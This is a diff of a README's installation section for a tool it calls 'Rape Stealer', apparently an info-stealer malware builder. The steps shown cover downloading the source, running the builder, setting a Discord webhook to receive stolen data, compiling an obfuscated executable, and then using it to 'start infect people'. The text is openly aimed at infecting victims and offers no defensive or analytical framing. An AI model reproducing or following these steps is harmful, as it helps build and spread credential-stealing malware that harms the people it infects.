@@ -61,13 +61,13 @@
 
 ## 📥 Installation & Build
 
-1. **Environment**: Install [Python 3.11.0](https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe) (Required).
+1. **Environment**: Install [Python 3.10.0](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe) (Required).
 2. **Payload Setup**:
     - Download and extract the **Rape Stealer** source.
-    - Run `install.bat` to download the required exploitation libraries.
+    - Run `builder.py`.
 3. **Compilation**:
-    - Configure your Discord Webhook in the builder.
-    - Compile your obfuscated executable and deploy.
+    - Configure your settings and webhook.
+    - Then click build and wait, after the exe file is ready you can start infect people with that.
 
 ---
 
